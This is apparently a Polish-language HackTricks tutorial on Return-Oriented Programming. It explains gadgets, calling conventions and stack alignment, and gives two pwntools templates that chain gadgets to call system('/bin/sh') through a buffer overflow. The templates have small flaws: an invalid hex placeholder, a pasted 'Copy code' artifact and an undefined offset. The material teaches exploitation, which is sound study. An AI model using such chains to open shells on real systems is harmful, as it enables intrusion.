# ROP - Return Oriented Programing

<details>

<summary><strong>Zacznij naukę hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Podstawowe informacje**

**Return-Oriented Programming (ROP)** to zaawansowana technika eksploatacji używana do obejścia zabezpieczeń takich jak **No-Execute (NX)** lub **Data Execution Prevention (DEP)**. Zamiast wstrzykiwania i wykonania shellcode'u, atakujący wykorzystuje fragmenty kodu już obecnego w binarnym pliku lub w załadowanych bibliotekach, znanych jako **"gadżety"**. Każdy gadżet zwykle kończy się instrukcją `ret` i wykonuje małą operację, taką jak przenoszenie danych między rejestrami lub wykonywanie operacji arytmetycznych. Łącząc te gadżety ze sobą, atakujący może skonstruować ładunek w celu wykonania dowolnych operacji, skutecznie omijając zabezpieczenia NX/DEP.

### Jak działa ROP

1. **Przechwycenie przepływu sterowania**: Najpierw atakujący musi przejąć kontrolę nad przepływem programu, zwykle wykorzystując przepełnienie bufora do nadpisania zapisanego adresu powrotu na stosie.
2. **Łańcuchowanie gadżetów**: Atakujący następnie starannie wybiera i łączy gadżety, aby wykonać pożądane akcje. Może to obejmować ustawienie argumentów dla wywołania funkcji, wywołanie funkcji (np. `system("/bin/sh")`) i obsługę koniecznego sprzątania lub dodatkowych operacji.
3. **Wykonanie ładunku**: Gdy podatna funkcja zwraca wartość, zamiast powrotu do prawidłowej lokalizacji, zaczyna wykonywać łańcuch gadżetów.

## Łańcuch ROP w przykładzie x86

### **Konwencje wywoływania x86 (32-bitowe)**

* **cdecl**: Wywołujący czyści stos. Argumenty funkcji są przekazywane na stosie w odwrotnej kolejności (od prawej do lewej). **Argumenty są przekazywane na stosie od prawej do lewej.**
* **stdcall**: Podobnie jak cdecl, ale wywoływany jest odpowiedzialny za czyszczenie stosu.

### **Znajdowanie gadżetów**

Najpierw załóżmy, że zidentyfikowaliśmy niezbędne gadżety w binarnym pliku lub jego załadowanych bibliotekach. Interesują nas gadżety:

* `pop eax; ret`: Ten gadżet zdejmuje wartość ze szczytu stosu do rejestru `EAX`, a następnie zwraca, umożliwiając kontrolę nad `EAX`.
* `pop ebx; ret`: Podobnie jak powyższy, ale dla rejestru `EBX`, umożliwiając kontrolę nad `EBX`.
* `mov [ebx], eax; ret`: Przenosi wartość z `EAX` do lokalizacji pamięci wskazywanej przez `EBX`, a następnie zwraca.
* Dodatkowo mamy dostępny adres funkcji `system()`.

### **Łańcuch ROP**

Korzystając z **pwntools**, przygotowujemy stos do wykonania łańcucha ROP w następujący sposób, mając na celu wykonanie `system('/bin/sh')`, zauważ, jak łańcuch zaczyna się od:

1. Instrukcji `ret` w celu wyrównania (opcjonalnie)
2. Adres funkcji `system` (przy założeniu wyłączonego ASLR i znanego libc, więcej informacji w [**Ret2lib**](ret2lib/))
3. Miejsce na adres powrotu z `system()`
4. Adres łańcucha `"/bin/sh"` (parametr dla funkcji systemowej)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadcode

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## Łańcuch ROP w przykładzie x64

### **Konwencje wywoływania x64 (64-bitowe)**

* Wykorzystuje konwencję wywoływania **System V AMD64 ABI** w systemach typu Unix, gdzie **pierwsze sześć argumentów całkowitych lub wskaźników jest przekazywanych w rejestrach `RDI`, `RSI`, `RDX`, `RCX`, `R8` i `R9`**. Dodatkowe argumenty są przekazywane na stosie. Wartość zwracana jest umieszczana w `RAX`.
* Konwencja wywoływania **Windows x64** wykorzystuje `RCX`, `RDX`, `R8` i `R9` dla pierwszych czterech argumentów całkowitych lub wskaźników, a dodatkowe argumenty są przekazywane na stosie. Wartość zwracana jest umieszczana w `RAX`.
* **Rejestry**: 64-bitowe rejestry obejmują `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` oraz `R8` do `R15`.

#### **Znajdowanie Gadgetów**

W naszym przypadku skupimy się na gadżetach, które pozwolą nam ustawić rejestr **RDI** (aby przekazać ciąg **"/bin/sh"** jako argument do funkcji **system()**) i następnie wywołać funkcję **system()**. Załóżmy, że zidentyfikowaliśmy następujące gadżety:

* **pop rdi; ret**: Usuwa wartość ze szczytu stosu do rejestru **RDI** i następnie zwraca. Istotne dla ustawienia argumentu dla **system()**.
* **ret**: Proste zwrócenie, przydatne do wyrównania stosu w niektórych scenariuszach.

I znamy adres funkcji **system()**.

### **Łańcuch ROP**

Poniżej znajduje się przykład wykorzystujący **pwntools** do skonfigurowania i wykonania łańcucha ROP mającego na celu wykonanie **system('/bin/sh')** na architekturze **x64**:
```python
pythonCopy codefrom pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
W tym przykładzie:

* Wykorzystujemy gadżet **`pop rdi; ret`** aby ustawić **`RDI`** na adres **`"/bin/sh"`**.
* Bezpośrednio skaczemy do **`system()`** po ustawieniu **`RDI`**, z adresem **`system()`** w łańcuchu.
* Jeśli docelowe środowisko tego wymaga, używamy gadżetu **`ret_gadget`** do wyrównania, co jest bardziej powszechne w architekturze **x64** w celu zapewnienia poprawnego wyrównania stosu przed wywołaniem funkcji.

### Wyrównanie stosu

**ABI x86-64** zapewnia, że **stos jest wyrównany do 16 bajtów** podczas wykonywania instrukcji **call**. **LIBC**, w celu optymalizacji wydajności, **wykorzystuje instrukcje SSE** (takie jak **movaps**), które wymagają tego wyrównania. Jeśli stos nie jest odpowiednio wyrównany (czyli **RSP** nie jest wielokrotnością 16), wywołania funkcji takich jak **system** zawiodą w łańcuchu **ROP**. Aby to naprawić, po prostu dodaj **gadżet ret** przed wywołaniem **system** w swoim łańcuchu ROP.

## Główne różnice między x86 a x64

{% hint style="success" %}
Ponieważ x64 używa rejestrów dla pierwszych kilku argumentów, często wymaga mniej gadżetów niż x86 do prostych wywołań funkcji, ale znalezienie i łączenie odpowiednich gadżetów może być bardziej skomplikowane ze względu na zwiększoną liczbę rejestrów i większą przestrzeń adresową. Zwiększona liczba rejestrów i większa przestrzeń adresowa w architekturze **x64** stanowią zarówno szanse, jak i wyzwania dla rozwoju exploitów, zwłaszcza w kontekście programowania zorientowanego na powrót (ROP).
{% endhint %}

## Zabezpieczenia

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/)
* [**Kanarki stosu**](../common-binary-protections-and-bypasses/stack-canaries/)

## Inne przykłady i odnośniki

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## Techniki oparte na ROP

Zauważ, że ROP to tylko technika wykonania arbitralnego kodu. Na podstawie ROP opracowano wiele technik Ret2XXX:

* **Ret2lib**: Użyj ROP do wywołania arbitralnych funkcji z załadowanej biblioteki z arbitralnymi parametrami (zwykle coś w rodzaju `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: Użyj ROP do przygotowania wywołania syscall, np. `execve`, i wykonaj arbitralne polecenia.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: Pierwsza technika wykorzystuje EBP zamiast EIP do kontrolowania przepływu, a druga jest podobna do Ret2lib, ale w tym przypadku przepływ jest kontrolowany głównie za pomocą adresów EBP (choć konieczne jest również kontrolowanie EIP).

{% content-ref url="ebp2ret-ebp-chaining.md" %}
[ebp2ret-ebp-chaining.md](ebp2ret-ebp-chaining.md)
{% endcontent-ref %}
